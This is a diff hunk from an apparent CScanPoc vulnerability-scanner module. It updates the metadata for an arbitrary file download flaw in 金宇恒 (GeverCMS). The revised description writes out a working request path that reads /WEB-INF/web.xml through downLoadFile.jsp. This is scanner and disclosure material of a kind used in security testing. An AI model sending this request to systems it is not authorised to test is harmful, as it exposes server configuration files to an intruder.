@@ -5,18 +5,18 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'gevercms_0000' # 平台漏洞编号，留空
-    name = '金宇恒内容管理系统通用型任意文件下载漏洞' # 漏洞名称
+    vuln_id = 'GeverCMS_0000' # 平台漏洞编号，留空
+    name = '金宇恒内容管理系统通用型任意文件下载' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
     disclosure_date = '2014-09-03'  # 漏洞公布时间
     desc = '''
-        金宇恒内容管理系统通用型任意文件下载漏洞
+        金宇恒内容管理系统 /adminroot/common/downLoadFile.jsp?filepath=/WEB-INF/web.xml&filename=None 通用型任意文件下载漏洞。
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=069009' # 漏洞来源
+    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=069009
     cnvd_id = '' # cnvd漏洞编号
     cve_id = '' #cve编号
-    product = 'gevercms'  # 漏洞应用名称
+    product = 'GeverCMS'  # 漏洞应用名称
     product_version = ''  # 漏洞应用版本
 
 
